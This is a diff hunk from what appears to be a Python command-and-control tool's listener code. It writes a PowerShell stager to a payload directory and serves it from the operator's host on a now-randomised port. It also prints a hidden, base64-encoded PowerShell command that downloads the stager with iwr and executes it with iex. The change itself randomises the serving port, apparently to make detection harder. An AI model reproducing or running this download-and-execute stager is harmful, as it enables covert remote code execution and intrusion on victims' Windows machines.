@@ -153,8 +153,9 @@ def printListener():
     with open((payloaddir()+ '/' + powershellFileName), 'w') as powershellStagerFile:
         powershellStagerFile.write(windows_powershell_stager)
         powershellStagerFile.close()
-    FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), powershellFileName, payloaddir(), port=8899, printIt = False)
-    print 'powershell -w hidden -noni -enc ' + ("(iwr " + FUNCTIONS().CheckInternet() + ":8899" + "/" + powershellFileName + ") | iex").encode('utf_16_le').encode('base64').replace('\n','')
+    randoStagerDLPort = random.randint(5000,9000)
+    FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
+    print 'powershell -w hidden -noni -enc ' + ("(iwr " + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + ") | iex").encode('utf_16_le').encode('base64').replace('\n','')
     return "pass"
 
 def pingClients(clientconn,clientnumber):
